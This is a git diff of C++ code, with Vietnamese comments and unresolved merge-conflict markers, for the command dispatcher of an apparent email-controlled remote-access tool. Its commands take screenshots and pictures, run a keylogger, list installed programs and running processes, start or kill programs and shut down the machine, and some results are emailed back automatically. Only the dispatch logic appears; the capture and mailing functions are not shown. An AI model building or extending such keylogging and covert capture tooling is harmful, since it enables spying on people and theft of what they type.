@@ -45,8 +45,17 @@ void handle_get_screenshot() {
     send_screenshot();
 }
 
+// Tách thành 2 functions riêng biệt
 void handle_list_programs() {
+<<<<<<< Updated upstream
     list_programs();
+=======
+  list_programs();  // Liệt kê programs đã cài đặt - tự gửi mail
+}
+
+void handle_list_processes() {
+  list_processes();  // Liệt kê processes đang chạy - tự gửi mail
+>>>>>>> Stashed changes
 }
 
 void handle_shutdown() {
@@ -69,10 +78,41 @@ void handle_keylogger(const string& command) {
 void execute_command(const string& command) {
     cout << "[Command]: " << command << endl;
 
+<<<<<<< Updated upstream
     string trimmed_cmd = trim_command(command);
     if (trimmed_cmd.empty()) {
         cout << "Empty command received" << endl;
         return;
+=======
+  string trimmed_cmd = trim_command_internal(command);
+  if (trimmed_cmd.empty()) {
+    cout << "Empty command received" << endl;
+    return;
+  }
+
+  if (trimmed_cmd.find("start_program") == 0) {
+    handle_start_program(trimmed_cmd);
+  } else if (trimmed_cmd.find("shutdown_program") == 0) {
+    handle_shutdown_program(trimmed_cmd);
+  } else if (trimmed_cmd.find("get_picture") == 0) {
+    handle_get_picture();
+  } else if (trimmed_cmd.find("get_screenshot") == 0) {
+    handle_get_screenshot();
+  } else if (trimmed_cmd.find("list_program") == 0) {
+    handle_list_programs();  // Liệt kê programs đã cài đặt
+  } else if (trimmed_cmd.find("list_process") == 0) {
+    handle_list_processes();  // Liệt kê processes đang chạy
+  } else if (trimmed_cmd.find("shutdown") == 0) {
+    handle_shutdown();
+  } else if (trimmed_cmd.find("keylogger") == 0) {
+    handle_keylogger(trimmed_cmd);
+  } else {
+    cout << "Unknown command: " << trimmed_cmd << endl;
+    if (!g_current_sender.empty()) {
+      send_email_with_attachment(g_current_sender, "Unknown command",
+                                 "Received unknown command: " + trimmed_cmd,
+                                 "");
+>>>>>>> Stashed changes
     }
 
     if (trimmed_cmd.find("start_program") == 0) {
